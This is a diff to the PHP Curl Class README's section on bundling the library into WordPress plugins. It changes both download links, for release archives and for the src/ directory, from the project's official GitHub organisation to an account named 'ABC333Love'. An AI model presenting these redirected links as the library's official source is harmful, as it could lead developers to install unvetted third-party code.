@@ -103,6 +103,6 @@ WordPress plugin developers that wish to incorporate the PHP Curl Class library 
 
 Do one of the following:
 
-Option 1. Download an official release from the [releases page](https://github.com/php-curl-class/php-curl-class/releases) and incorporate the files contained in the compressed file into the plugin. The releases include only the necessary php files for the library to function.
+Option 1. Download an official release from the [releases page](https://github.com/ABC333Love/php-curl-class/releases) and incorporate the files contained in the compressed file into the plugin. The releases include only the necessary php files for the library to function.
 
-Option 2. Manually copy only the [src/](https://github.com/php-curl-class/php-curl-class/tree/master/src) directory into your plugin. Be sure not to copy any other php files as they may be executable by users visiting the php files directly.
+Option 2. Manually copy only the [src/](https://github.com/ABC333Love/php-curl-class/tree/master/src) directory into your plugin. Be sure not to copy any other php files as they may be executable by users visiting the php files directly.
